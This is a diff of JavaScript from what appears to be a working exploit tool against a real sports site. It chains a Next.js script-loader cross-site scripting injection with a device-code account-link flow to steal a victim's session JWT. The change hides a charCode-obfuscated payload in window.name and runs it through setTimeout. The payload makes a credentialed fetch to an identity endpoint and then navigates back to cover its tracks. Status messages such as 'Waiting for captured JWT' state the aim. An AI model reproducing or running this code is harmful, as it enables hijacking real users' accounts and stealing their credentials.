@@ -37,13 +37,10 @@
     const textPlain = charCodeExpression("text/plain");
     const requestBody = charCodeExpression(JSON.stringify({ code }));
     const timeoutName = charCodeExpression("setTimeout");
-    const historyName = charCodeExpression("history");
-    const backName = charCodeExpression("back");
-    const bindName = charCodeExpression("bind");
-    return `top[${fetchName}](${identityEndpoint},{method:${post},credentials:${include},headers:{[${contentType}]:${textPlain}},body:${requestBody},keepalive:true});top[${timeoutName}](top[${historyName}][${backName}][${bindName}](top[${historyName}]),5000)`;
+    return `top[${fetchName}](${identityEndpoint},{method:${post},credentials:${include},headers:{[${contentType}]:${textPlain}},body:${requestBody}});top.name="";top[${timeoutName}](top.history.back.bind(top.history),5000)`;
   }
 
-  function exploitUrl(code) {
+  function exploitUrl() {
     const attackerNextData = {
       props: { pageProps: {} },
       page: "/block-preview",
@@ -54,7 +51,7 @@
       scriptLoader: [{
         id: "NBA_GLEAGUE_RENDEZVOUS_ATO",
         strategy: "afterInteractive",
-        dangerouslySetInnerHTML: { __html: exploitScript(code) }
+        dangerouslySetInnerHTML: { __html: `top[${charCodeExpression("setTimeout")}](top.name,0)` }
       }]
     };
     const attrs = {
@@ -106,6 +103,7 @@
   }
 
   async function poll(deviceId, code) {
+    window.name = "";
     history.replaceState(null, "", CLEAN_URL);
     status.textContent = "Account link sent. Waiting for captured JWT…";
     for (let attempt = 0; attempt < 120; attempt += 1) {
@@ -148,7 +146,8 @@
 
     status.textContent = "Device code created. Triggering G League XSS…";
     sessionStorage.setItem(SESSION_KEY, JSON.stringify(session));
-    location.href = exploitUrl(session.code);
+    window.name = exploitScript(session.code);
+    location.href = exploitUrl();
   }
 
   start().catch(error => {
